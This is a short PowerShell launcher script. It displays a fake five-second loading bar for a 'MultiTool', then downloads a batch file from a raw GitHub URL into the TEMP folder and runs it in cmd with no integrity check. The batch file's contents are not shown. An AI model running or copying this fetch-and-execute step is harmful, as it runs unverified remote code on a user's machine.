# --- Clean Loading Bar ---
$loadingTime = 5       # Total loading time in seconds
$steps = 20            # Total steps in the bar
$interval = $loadingTime / $steps

Write-Host "`n[INFO] Initializing MultiTool..." -ForegroundColor Cyan

for ($i = 1; $i -le $steps; $i++) {
    $percent = [math]::Round(($i / $steps) * 100)
    
    # Progress bar using only safe ASCII characters
    $bar = ""
    for ($j = 1; $j -le $steps; $j++) {
        if ($j -le $i) {
            $bar += "="
        } else {
            $bar += " "
        }
    }

    Write-Host -NoNewline "`r[$bar] $percent%"
    Start-Sleep -Milliseconds ($interval * 1000)
}

Write-Host "`n[INFO] Loading Complete!`n" -ForegroundColor Green

# --- Download the Batch Tool ---
$toolUrl = "https://raw.githubusercontent.com/GigaVolt3/multitool/main/new.bat"
$tempPath = "$env:TEMP\multitool.bat"

Invoke-WebRequest -UseBasicParsing -Uri $toolUrl -OutFile $tempPath

# --- Launch it in CMD ---
Start-Process cmd -ArgumentList "/k `"$tempPath`""
